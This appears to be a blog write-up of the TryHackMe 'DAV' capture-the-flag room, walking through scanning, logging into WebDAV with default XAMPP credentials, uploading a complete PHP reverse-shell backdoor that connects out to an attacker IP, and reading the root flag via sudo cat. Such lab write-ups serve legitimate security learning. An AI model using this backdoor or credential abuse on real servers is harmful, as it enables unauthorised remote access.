---
layout: post
title: "DAV CTF Write-up"
date: 2024-10-19
link: https://tryhackme.com/room/bsidesgtdav
link_text: "DAV CTF"
categories: ctf-writeups
---

The goal of this CTF is to gain access to `user.txt` and `root.txt`.

---

We always start by running an **nmap** scan on the target machine.

```bash
nmap -p- -A -T5 [target machine IP]
```

- **`-p-`**: Scans all ports
- **`-A`**: Shows all information
- **`-T5`**: Denotes speed on a scale of 1 to 5

![Nmap scan output](/assets/writeup_assets/dav-ctf-writeup/figure_1.png "Figure 1: Nmap scan output")
*Figure 1: nmap scan output*

One port here, port **80** running **HTTP**.

---

Obvious next step is to run **dirbuster** and investigate the webpage in a browser.

```bash
dirb http://[target machine IP]
```

![Dirbuster output](/assets/writeup_assets/dav-ctf-writeup/figure_2.png "Figure 2: Dirbuster output")
*Figure 2: Dirbuster output*

We got a few hits. Specifically, **/webdav** is interesting. It brings up a JavaScript login pop-up that we do not know the credentials for. We can keep this in mind for later.

---

While researching **webdav** vulnerabilities, I came across a blog post: [RCE via Webdav - Power of PUT](https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60).

The author described some common **webdav** vulnerabilities, and listed a few sets of default credentials. I tried these while reading and found that **wampp:xampp** were the correct credentials for this server. The source is [here](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html).

That blog notes that a **PHP backdoor** can be used. I used ChatGPT to generate a reverse shell script and saved it as `backdoor.php`.

```
<?php
set_time_limit(0);
$ip = 'YOUR_IP'; // Your attacker machine's IP
$port = YOUR_PORT; // The port you're listening on (e.g., 4444)
$socket = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) {
    echo "$errstr ($errno)\n";
    exit(1);
}
$descriptorspec = array(
    0 => array("pipe", "r"), // stdin
    1 => array("pipe", "w"), // stdout
    2 => array("pipe", "w")  // stderr
);
$process = proc_open("/bin/sh", $descriptorspec, $pipes);
if (is_resource($process)) {
    while ($data = fread($socket, 1024)) {
        fwrite($pipes[0], $data);
        $output = fread($pipes[1], 1024);
        fwrite($socket, $output);
    }
    fclose($socket);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
?>
```

I followed the blog’s instructions on how to upload the file to the server. Once it was there, I set up a **netcat** listener.

```bash
nc -lvnp 80
```

Finally, I clicked on my file in the browser (`http://[target machine IP]/webdav/backdoor.php`), and now I have a remote connection.

---

I found **user.txt** in **/home/merlin**.

![user.txt](/assets/writeup_assets/dav-ctf-writeup/figure_3.png "Figure 3: user.txt")
*Figure 3: user.txt*

---

We can use `sudo -l` to discover that we can run `cat` on any file. From here, it's simple to find the root flag.

```bash
sudo /bin/cat /root/root.txt
```

![root.txt](/assets/writeup_assets/dav-ctf-writeup/figure_4.png "Figure 4: root.txt")
*Figure 4: root.txt*

---

Just like that, the box is complete! Congratulations!

